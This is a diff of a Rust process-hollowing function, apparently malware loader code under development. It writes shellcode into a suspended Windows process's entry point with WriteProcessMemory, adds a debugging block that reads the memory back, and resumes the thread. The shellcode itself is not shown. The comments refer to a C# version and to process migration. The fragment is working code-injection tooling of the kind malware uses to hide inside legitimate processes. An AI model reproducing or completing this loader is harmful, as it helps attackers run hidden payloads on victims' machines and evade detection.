@@ -91,12 +91,24 @@ pub fn hollow_and_run(shellcode: &[u8]) {
         panic!("An offset looks incorrect, the optional header magic bytes don't correspond to '0x020B'");
     }
 
-    // The issue must be from here down. All the offsets look the same in my C# version as they do here
-
-    let write_result = unsafe { WriteProcessMemory(process_handle, entry_point_address as _, shellcode.as_ptr() as _, shellcode.len(), ptr::null_mut()) };
+    let write_result = unsafe { WriteProcessMemory(process_handle, entry_point_address as *const c_void, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut()) };
     if !write_result.as_bool() {
         panic!("Could not write the shellcode to the suspended process with WriteProcessMemory");
     }
+
+// THIS PART WAS PURELY DEBUGGING
+
+    let mut shellcode_buffer = [0; 0x1CC];
+    let read_result = unsafe { ReadProcessMemory(process_handle, entry_point_address as *const c_void, shellcode_buffer.as_mut_ptr() as _, shellcode_buffer.len(), ptr::null_mut()) };
+    if !read_result.as_bool() {
+        panic!("Could not read the DOS header with ReadProcessMemory");
+    }
+
+    println!("{shellcode_buffer:?}");
+
+// END DEBUGGING
+
+    // The issue must be from here down. Process migration and process hollowing memory look identical post-write
 
     // Start it back up with ResumeThread
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
